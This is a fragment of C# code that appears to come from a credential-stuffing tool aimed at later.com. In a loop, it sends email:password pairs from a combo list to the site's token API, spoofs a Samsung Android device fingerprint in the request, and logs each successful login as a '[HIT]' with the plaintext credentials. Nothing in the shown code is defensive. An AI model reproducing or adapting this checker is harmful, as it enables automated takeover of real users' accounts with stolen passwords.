        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              string str = "{\"device\":{\"build_number\":1905150702,\"name\":\"Samsung SM-G950U1\",\"os\":\"Android SDK 22\",\"time_zone\":\"Mountain Standard Time -07:00\",\"udid\":\"d6e3d010dcdd1af1\",\"version\":\"5.15.7.2\"},\"auth\":{\"email\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\"}}";
              if (httpRequest.Post("https://app.later.com/api/tokens", str, "application/json;charset=UTF-8").ToString().Contains("{\"auth_token"))
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - LATER.COM] " + s[0] + ":" + s[1], Color.Green);
